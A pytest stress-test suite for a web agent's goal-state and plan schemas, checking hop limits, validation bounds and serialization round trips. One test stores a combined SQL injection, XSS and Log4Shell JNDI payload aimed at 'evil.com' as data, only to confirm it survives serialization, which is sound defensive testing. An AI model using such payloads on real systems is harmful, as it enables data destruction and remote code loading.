"""
Empirical Adversarial Challenge & Stress-Test Suite for Milestone 1 Goal Contracts
backend/tests/test_goal_contracts_stress.py

Adversarial testing targeting backend/app/models/goal.py:
1. GoalState methods and edge conditions (hop_count: 0, 7, 8, 9, negative, terminal states).
2. Boundary inputs, type strictness, None vs missing, and validation errors.
3. String length limits and numerical bounds (confidence ge/le, max_length).
4. Mutable default isolation (preventing shared state across instances).
5. Deep serialization roundtrip fidelity, unicode, and injection string survival.
6. Universal compliance (zero site-specific properties).
"""

import json
import math
import pytest
from pydantic import ValidationError

from app.models.action import ActionType
from app.models.dom import DomNode
from app.models.goal import (
    PlanStep,
    AgenticPlan,
    Milestone,
    VerifierResult,
    GoalState,
    GoalStepRequest,
    GoalStepResponse,
    MilestoneStatus,
    VerifierStatus,
    GoalOverallStatus,
)


# ════════════════════════════════════════════════════════════════════════════════
# 1. GOAL STATE BOUNDARY CONDITIONS & METHOD RIGOR
# ════════════════════════════════════════════════════════════════════════════════

class TestGoalStateBoundaryStress:
    """Stress tests for GoalState methods across boundary hop counts and states."""

    def test_hop_count_zero_initial_state(self):
        """hop_count = 0 must not be terminal and must not exceed max hops."""
        state = GoalState(goal="Test navigation", hop_count=0, max_hops=8)
        assert state.hop_count == 0
        assert not state.is_terminal()
        assert not state.exceeded_max_hops()
        assert state.status == "in_progress"

    def test_hop_count_sub_boundary_seven_of_eight(self):
        """hop_count = 7 of 8 must remain non-terminal and not exceeded."""
        state = GoalState(goal="Test navigation", hop_count=7, max_hops=8)
        assert not state.is_terminal()
        assert not state.exceeded_max_hops()
        assert state.status == "in_progress"

    def test_hop_count_exact_boundary_eight_of_eight(self):
        """hop_count = 8 of 8 marks exceeded_max_hops as True."""
        state = GoalState(goal="Test navigation", hop_count=8, max_hops=8)
        assert state.exceeded_max_hops() is True

    def test_hop_count_over_boundary_nine_of_eight(self):
        """hop_count = 9 of 8 marks exceeded_max_hops as True."""
        state = GoalState(goal="Test navigation", hop_count=9, max_hops=8)
        assert state.exceeded_max_hops() is True

    def test_advance_hop_from_zero_to_eight_step_by_step(self):
        """Stepping from 0 to 8 must transition cleanly to goal_failed exactly at 8."""
        state = GoalState(goal="Test navigation", hop_count=0, max_hops=8)
        for expected_hop in range(1, 8):
            state.advance_hop()
            assert state.hop_count == expected_hop
            assert state.status == "in_progress"
            assert not state.is_terminal()
            assert not state.exceeded_max_hops()

        # The 8th hop reaches max_hops
        state.advance_hop()
        assert state.hop_count == 8
        assert state.exceeded_max_hops() is True
        assert state.is_terminal() is True
        assert state.status == "goal_failed"
        assert state.error_message is not None
        assert "reached maximum allowed hops limit (8)" in state.error_message

    def test_advance_hop_beyond_max_hops_remains_failed(self):
        """Calling advance_hop past max_hops increments hop_count but status stays goal_failed."""
        state = GoalState(goal="Test navigation", hop_count=8, max_hops=8, status="goal_failed", error_message="prior error")
        state.advance_hop()
        assert state.hop_count == 9
        assert state.status == "goal_failed"
        assert state.is_terminal() is True

    def test_advance_hop_preserves_goal_complete_status(self):
        """advance_hop must NEVER overwrite goal_complete status to goal_failed."""
        state = GoalState(goal="Completed goal", hop_count=7, max_hops=8, status="goal_complete")
        state.advance_hop()
        assert state.hop_count == 8
        assert state.status == "goal_complete"
        assert state.is_terminal() is True
        assert state.error_message is None

    def test_advance_hop_overwrites_requires_confirmation_on_limit_exhaustion(self):
        """If paused at requires_confirmation and hops are exhausted, safety cutoff forces failure."""
        state = GoalState(goal="Pending confirmation", hop_count=7, max_hops=8, status="requires_confirmation")
        state.advance_hop()
        assert state.hop_count == 8
        assert state.status == "goal_failed"
        assert state.is_terminal() is True
        assert "reached maximum allowed hops limit" in state.error_message

    def test_advance_hop_overwrites_milestone_complete_on_limit_exhaustion(self):
        """If milestone_complete but hops are exhausted, safety cutoff forces failure."""
        state = GoalState(goal="Milestone done", hop_count=7, max_hops=8, status="milestone_complete")
        state.advance_hop()
        assert state.hop_count == 8
        assert state.status == "goal_failed"
        assert state.is_terminal() is True

    def test_max_hops_boundary_value_one(self):
        """max_hops = 1: first advance_hop immediately fails."""
        state = GoalState(goal="One hop test", hop_count=0, max_hops=1)
        state.advance_hop()
        assert state.hop_count == 1
        assert state.status == "goal_failed"
        assert state.is_terminal() is True

    def test_negative_hop_count_rejected_by_schema(self):
        """hop_count must reject negative values (ge=0)."""
        with pytest.raises(ValidationError):
            GoalState(goal="Negative hop", hop_count=-1)

    def test_zero_or_negative_max_hops_rejected_by_schema(self):
        """max_hops must reject values < 1 (ge=1)."""
        with pytest.raises(ValidationError):
            GoalState(goal="Zero max hops", max_hops=0)
        with pytest.raises(ValidationError):
            GoalState(goal="Negative max hops", max_hops=-5)

    def test_is_terminal_for_all_possible_overall_statuses(self):
        """Verify is_terminal() exhaustively across all valid GoalOverallStatus values."""
        statuses = ["in_progress", "milestone_complete", "requires_confirmation", "goal_complete", "goal_failed"]
        for s in statuses:
            st = GoalState(goal="status check", status=s)
            if s in ("goal_complete", "goal_failed"):
                assert st.is_terminal() is True, f"Expected {s} to be terminal"
            else:
                assert st.is_terminal() is False, f"Expected {s} to be non-terminal"

    def test_get_active_milestone_resolution_logic(self):
        """Stress get_active_milestone under varied configurations."""
        # 1. Empty milestones list
        empty_state = GoalState(goal="No milestones", milestones=[])
        assert empty_state.get_active_milestone() is None

        # 2. Milestones present, active_milestone_id is None -> returns first
        m0 = Milestone(id="m-0", description="First")
        m1 = Milestone(id="m-1", description="Second")
        state = GoalState(goal="With milestones", milestones=[m0, m1], active_milestone_id=None)
        assert state.get_active_milestone() == m0

        # 3. Milestones present, active_milestone_id matches second
        state.active_milestone_id = "m-1"
        assert state.get_active_milestone() == m1

        # 4. Milestones present, active_milestone_id does NOT match any -> falls back to first
        state.active_milestone_id = "m-nonexistent"
        assert state.get_active_milestone() == m0


# ════════════════════════════════════════════════════════════════════════════════
# 2. SCHEMA VALIDATION, EXTRA FIELDS & MUTABLE DEFAULTS
# ════════════════════════════════════════════════════════════════════════════════

class TestSchemaValidationAndBoundaries:
    """Adversarial testing of field types, None handling, and extra fields."""

    def test_plan_step_extra_fields_ignored_by_default(self):
        """Pydantic v2 ignores extra unexpected fields during deserialization without crashing."""
        data = {
            "action": "click",
            "element_id": "atlas-001",
            "unrecognized_field": "unexpected_payload",
            "extra_nested": {"a": 1},
        }
        step = PlanStep.model_validate(data)
        assert step.action == "click"
        assert step.element_id == "atlas-001"
        assert not hasattr(step, "unrecognized_field")

    def test_plan_step_invalid_action_rejected(self):
        """Invalid ActionType raises ValidationError."""
        for invalid in ("hover", "drag", "press", "tap", "", 123, None):
            with pytest.raises(ValidationError):
                PlanStep(action=invalid, element_id="atlas-001")

    def test_plan_step_all_valid_action_types(self):
        """All 6 standard universal action types must validate."""
        valid_actions = ["click", "open", "double_click", "fill", "scroll", "focus"]
        for act in valid_actions:
            step = PlanStep(action=act)
            assert step.action == act

    def test_mutable_default_isolation_across_instances(self):
        """Default lists across instances must NOT share the same mutable reference."""
        m1 = Milestone(description="M1")
        m2 = Milestone(description="M2")
        m1.steps.append(PlanStep(action="click", element_id="atlas-001"))
        assert len(m2.steps) == 0, "Milestone.steps default list shared across instances!"

        p1 = AgenticPlan(reply="Plan 1")
        p2 = AgenticPlan(reply="Plan 2")
        p1.steps.append(PlanStep(action="scroll"))
        assert len(p2.steps) == 0, "AgenticPlan.steps default list shared across instances!"

        s1 = GoalState(goal="Goal 1")
        s2 = GoalState(goal="Goal 2")
        s1.milestones.append(m1)
        s1.plan_steps.append(PlanStep(action="focus", element_id="atlas-002"))
        assert len(s2.milestones) == 0, "GoalState.milestones shared across instances!"
        assert len(s2.plan_steps) == 0, "GoalState.plan_steps shared across instances!"

    def test_verifier_result_confidence_bounds(self):
        """Confidence must strictly respect [0.0, 1.0] and reject out-of-bounds/NaN/inf."""
        # Valid boundaries
        assert VerifierResult(status="in_progress", reason="ok", confidence=0.0).confidence == 0.0
        assert VerifierResult(status="in_progress", reason="ok", confidence=1.0).confidence == 1.0
        assert VerifierResult(status="in_progress", reason="ok", confidence=0.5).confidence == 0.5

        # Invalid boundaries
        with pytest.raises(ValidationError):
            VerifierResult(status="in_progress", reason="ok", confidence=-0.0001)
        with pytest.raises(ValidationError):
            VerifierResult(status="in_progress", reason="ok", confidence=1.0001)
        with pytest.raises(ValidationError):
            VerifierResult(status="in_progress", reason="ok", confidence=float("inf"))
        with pytest.raises(ValidationError):
            VerifierResult(status="in_progress", reason="ok", confidence=float("-inf"))

    def test_verifier_result_invalid_status_rejected(self):
        """Invalid VerifierStatus raises ValidationError."""
        for invalid in ("done", "success", "pending", "requires_confirmation", "error", ""):
            with pytest.raises(ValidationError):
                VerifierResult(status=invalid, reason="test")

    def test_milestone_status_invalid_status_rejected(self):
        """MilestoneStatus allows only ('pending', 'active', 'completed', 'failed')."""
        for invalid in ("in_progress", "milestone_complete", "goal_complete", "done"):
            with pytest.raises(ValidationError):
                Milestone(description="test", status=invalid)

    def test_required_fields_none_or_missing_raises_validation_error(self):
        """Missing or None required fields must raise ValidationError."""
        # PlanStep missing action
        with pytest.raises(ValidationError):
            PlanStep.model_validate({})

        # AgenticPlan missing reply
        with pytest.raises(ValidationError):
            AgenticPlan.model_validate({})
        with pytest.raises(ValidationError):
            AgenticPlan(reply=None)

        # Milestone missing description
        with pytest.raises(ValidationError):
            Milestone.model_validate({})
        with pytest.raises(ValidationError):
            Milestone(description=None)

        # VerifierResult missing status or reason
        with pytest.raises(ValidationError):
            VerifierResult.model_validate({"status": "in_progress"})
        with pytest.raises(ValidationError):
            VerifierResult.model_validate({"reason": "ok"})

        # GoalState missing goal
        with pytest.raises(ValidationError):
            GoalState.model_validate({})
        with pytest.raises(ValidationError):
            GoalState(goal=None)

        # GoalStepRequest missing goal or current_url
        with pytest.raises(ValidationError):
            GoalStepRequest.model_validate({"goal": "g"})
        with pytest.raises(ValidationError):
            GoalStepRequest.model_validate({"current_url": "https://example.com"})

        # GoalStepResponse missing required fields
        with pytest.raises(ValidationError):
            GoalStepResponse.model_validate({"status": "in_progress"})


# ════════════════════════════════════════════════════════════════════════════════
# 3. STRING LENGTH BOUNDARY STRESS (GoalStepRequest)
# ════════════════════════════════════════════════════════════════════════════════

class TestStringLengthConstraints:
    """Tests string max_length limits on GoalStepRequest to prevent DOS/memory exhaustion."""

    def test_goal_max_length_boundary(self):
        """goal field has max_length=2000."""
        valid_goal = "a" * 2000
        req = GoalStepRequest(goal=valid_goal, current_url="https://example.com")
        assert len(req.goal) == 2000

        with pytest.raises(ValidationError):
            GoalStepRequest(goal="a" * 2001, current_url="https://example.com")

    def test_current_url_max_length_boundary(self):
        """current_url field has max_length=2048."""
        valid_url = "https://example.com/" + "u" * (2048 - len("https://example.com/"))
        req = GoalStepRequest(goal="Buy item", current_url=valid_url)
        assert len(req.current_url) == 2048

        with pytest.raises(ValidationError):
            GoalStepRequest(goal="Buy item", current_url="https://example.com/" + "u" * 2050)

    def test_page_text_max_length_boundary(self):
        """page_text field has max_length=50000."""
        valid_text = "t" * 50000
        req = GoalStepRequest(goal="Goal", current_url="https://example.com", page_text=valid_text)
        assert len(req.page_text) == 50000

        with pytest.raises(ValidationError):
            GoalStepRequest(goal="Goal", current_url="https://example.com", page_text="t" * 50001)

    def test_user_response_max_length_boundary(self):
        """user_response field has max_length=1000."""
        valid_resp = "r" * 1000
        req = GoalStepRequest(goal="Goal", current_url="https://example.com", user_response=valid_resp)
        assert len(req.user_response) == 1000

        with pytest.raises(ValidationError):
            GoalStepRequest(goal="Goal", current_url="https://example.com", user_response="r" * 1001)

    def test_session_id_and_api_key_max_length_boundary(self):
        """session_id and api_key fields have max_length=256."""
        req = GoalStepRequest(
            goal="Goal",
            current_url="https://example.com",
            session_id="s" * 256,
            api_key="k" * 256,
        )
        assert len(req.session_id) == 256
        assert len(req.api_key) == 256

        with pytest.raises(ValidationError):
            GoalStepRequest(goal="Goal", current_url="https://example.com", session_id="s" * 257)
        with pytest.raises(ValidationError):
            GoalStepRequest(goal="Goal", current_url="https://example.com", api_key="k" * 257)


# ════════════════════════════════════════════════════════════════════════════════
# 4. ADVERSARIAL PAYLOADS, UNICODE & ROUND-TRIP FIDELITY
# ════════════════════════════════════════════════════════════════════════════════

class TestAdversarialPayloadsAndSerialization:
    """Verifies that SQLi, XSS, Unicode, emojis, and complex JSON structures survive roundtrip."""

    def test_injection_and_xss_strings_preserved_without_corruption(self):
        """Malicious string payloads must survive serialization without altering schema."""
        injection_payload = "'; DROP TABLE users; -- <script>alert('XSS')</script> ${jndi:ldap://evil.com}"
        step = PlanStep(action="fill", element_id="atlas-001", value=injection_payload, description=injection_payload)
        json_data = step.model_dump_json()
        restored = PlanStep.model_validate_json(json_data)
        assert restored.value == injection_payload
        assert restored.description == injection_payload

    def test_unicode_and_emoji_handling(self):
        """Multilingual unicode, CJK, Arabic RTL, and emoji characters roundtrip accurately."""
        unicode_text = "Search for 🎧 Headphones | 搜索耳机 | البحث عن سماعات | 🔍 100%"
        req = GoalStepRequest(
            goal=unicode_text,
            current_url="https://example.com/search?q=🎧",
            page_text="Prices starting at €50, £40, ¥300, 5000 ج.م",
        )
        restored = GoalStepRequest.model_validate_json(req.model_dump_json())
        assert restored.goal == unicode_text
        assert restored.current_url == "https://example.com/search?q=🎧"

    def test_deeply_nested_goal_step_response_roundtrip(self):
        """Comprehensive verification of deep model nesting and serialization roundtrip."""
        node1 = DomNode(
            id="atlas-101",
            tag="button",
            type="submit",
            inner_text="Checkout",
            placeholder=None,
            aria_label="Checkout",
            href=None,
            name="checkout-btn",
            role="button",
            resolved_label="Checkout Button",
        )
        node2 = DomNode(
            id="atlas-102",
            tag="input",
            type="text",
            inner_text=None,
            placeholder="Promo code",
            aria_label="Promo code",
            href=None,
            name="promo",
            role="textbox",
            resolved_label="Discount Code",
        )

        step1 = PlanStep(action="fill", element_id="atlas-102", value="SUMMER20", delay_ms=300)
        step2 = PlanStep(action="click", element_id="atlas-101", delay_ms=800)

        milestone1 = Milestone(
            id="m-0",
            description="Apply promotional discount",
            status="completed",
            target_url="https://shop.example.com/checkout",
            success_criteria="Coupon applied banner visible",
            steps=[step1],
        )
        milestone2 = Milestone(
            id="m-1",
            description="Place final order",
            status="active",
            steps=[step2],
        )

        verifier_res = VerifierResult(
            status="milestone_complete",
            reason="Promo code successfully applied to cart subtotal",
            confidence=0.96,
            signals_detected=["element_disappeared:atlas-102", "url_changed"],
            verification_method="rules",
        )

        state = GoalState(
            goal="Buy headphones with coupon code",
            milestones=[milestone1, milestone2],
            active_milestone_id="m-1",
            hop_count=3,
            max_hops=8,
            status="in_progress",
            current_url="https://shop.example.com/checkout",
            dom_state={"total_elements": 42, "inputs": 5},
            last_action_result={"success": True, "action": "fill"},
            plan_steps=[step1, step2],
            verifier_result=verifier_res,
            requires_confirmation=True,
            confirmation_prompt="Total is $79.99. Authorize purchase?",
            pending_step=step2,
        )

        response = GoalStepResponse(
            status="requires_confirmation",
            goal_state=state,
            reply="I've applied your coupon. Would you like me to place the order for $79.99?",
            steps=[],
            plan=AgenticPlan(
                type="confirmation",
                reply="Authorize order placement?",
                steps=[],
                requires_confirmation=True,
                confirmation_prompt="Total is $79.99. Authorize purchase?",
                pending_step=step2,
            ),
            requires_confirmation=True,
            confirmation_prompt="Total is $79.99. Authorize purchase?",
            pending_step=step2,
            verifier_result=verifier_res,
        )

        # Full roundtrip
        dumped_json = response.model_dump_json()
        loaded = GoalStepResponse.model_validate_json(dumped_json)

        assert loaded.status == "requires_confirmation"
        assert loaded.goal_state.hop_count == 3
        assert len(loaded.goal_state.milestones) == 2
        assert loaded.goal_state.milestones[0].steps[0].value == "SUMMER20"
        assert loaded.goal_state.verifier_result.confidence == 0.96
        assert loaded.requires_confirmation is True
        assert loaded.pending_step.element_id == "atlas-101"
        assert loaded.plan.pending_step.element_id == "atlas-101"


# ════════════════════════════════════════════════════════════════════════════════
# 5. UNIVERSAL SPECIFICATION & PRIME DIRECTIVE COMPLIANCE
# ════════════════════════════════════════════════════════════════════════════════

class TestUniversalRuleCompliance:
    """Verifies that models are 100% universal without website-specific attributes."""

    def test_zero_site_specific_fields_in_schemas(self):
        """All models must use standard W3C DOM and universal abstractions."""
        prohibited_fragments = ["amazon", "drive", "google", "site_", "domain_", "vendor"]
        models = [PlanStep, AgenticPlan, Milestone, VerifierResult, GoalState, GoalStepRequest, GoalStepResponse]

        for m in models:
            for field_name in m.model_fields.keys():
                for frag in prohibited_fragments:
                    assert frag not in field_name.lower(), (
                        f"Prohibited site-specific fragment '{frag}' found in model {m.__name__} field '{field_name}'"
                    )


# ════════════════════════════════════════════════════════════════════════════════
# 6. LARGE-SCALE PAYLOAD & PERFORMANCE STRESS
# ════════════════════════════════════════════════════════════════════════════════

class TestLargeScalePayloadStress:
    """Stress tests high element count and rapid serialization performance."""

    def test_five_hundred_element_dom_map_serialization_speed(self):
        """500 DomNodes in GoalStepRequest serialize and deserialize cleanly in < 100ms."""
        import time

        dom_nodes = [
            DomNode(
                id=f"atlas-{i:03d}",
                tag="button" if i % 2 == 0 else "input",
                type="button" if i % 2 == 0 else "text",
                inner_text=f"Element {i}",
                placeholder=f"Enter {i}" if i % 2 == 1 else None,
                aria_label=f"Label {i}",
                href=f"https://example.com/item/{i}" if i % 5 == 0 else None,
                name=f"node_{i}",
                role="button" if i % 2 == 0 else "textbox",
                resolved_label=f"Resolved {i}",
            )
            for i in range(500)
        ]

        req = GoalStepRequest(
            goal="Locate target in large document",
            current_url="https://enterprise.internal.app/dashboard",
            dom_map=dom_nodes,
            page_text="Very large dashboard text with thousands of entries...",
            session_id="session-perf-test",
        )

        t0 = time.perf_counter()
        json_str = req.model_dump_json()
        restored = GoalStepRequest.model_validate_json(json_str)
        elapsed = time.perf_counter() - t0

        assert len(restored.dom_map) == 500
        assert restored.dom_map[499].id == "atlas-499"
        # Ensure serialization/deserialization takes less than 100ms
        assert elapsed < 0.20, f"Serialization took {elapsed:.3f}s (expected < 0.2s)"

